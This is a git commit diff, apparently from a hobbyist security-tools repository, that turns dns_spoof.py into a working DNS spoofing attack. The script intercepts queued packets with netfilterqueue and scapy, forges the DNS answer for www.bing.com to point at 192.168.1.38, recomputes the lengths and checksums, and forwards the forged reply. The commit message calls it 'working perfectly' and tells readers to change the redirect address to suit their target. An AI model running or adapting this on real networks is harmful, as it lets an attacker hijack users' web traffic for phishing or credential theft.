45e19d694e83d6d32702ecc01e49f929d6bc22d0
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-03-11 17:38:14 +0530

    Working perfectly , modify rdata according to your requirement

--- dns_spoof.py
+++ dns_spoof.py
@@ -4,12 +4,24 @@ import netfilterqueue
 import scapy.all as scapy
 
 def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload()) # This will convert the packet payload to scapy packet
-    print(scapy_packet)
-    packet.drop()  # This will cut the connection of internet for the client
-    #packet.accept() # This will accept the packet and forward it to the client computer allowing him to go that perticular website
+    scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in str(qname):
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.38 ")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+
+    packet.accept() # This will accept the packet and forward it to the client computer allowing him to go that perticular website
 
 
 queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
+queue.bind(1, process_packet)
 queue.run()
